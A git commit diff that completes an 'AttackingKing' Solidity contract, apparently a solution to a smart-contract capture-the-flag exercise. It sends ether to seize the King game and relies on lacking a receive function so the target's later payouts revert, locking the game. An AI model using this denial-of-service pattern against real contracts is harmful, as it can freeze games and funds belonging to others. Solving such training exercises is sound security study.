a2c32ac87c13dde59df1c55247994335640181bf
rohanagarwal <rohan.agarwal204@gmail.com>
2023-04-10 15:47:34 -0400

    fifth works

--- contracts/5. King/AttackingKing.sol
+++ contracts/5. King/AttackingKing.sol
@@ -5,12 +5,21 @@ import "hardhat/console.sol";
 
 contract AttackingKing {
     address public contractAddress;
+    King public king;
 
     constructor(address _contractAddress) payable {
         contractAddress = _contractAddress;
+        king = King(payable(contractAddress));
     }
 
     function hackContract() external {
         // Code me!
+        
+       contractAddress.call{value: 2 ether}("");
+       console.log(king._king());
+       console.log(king._prize());
     }
+
+    // by not having a fallback or receive function, the King contract cannot send to us!
+    // so it fails but we have still changed the king and prize :D 
 }
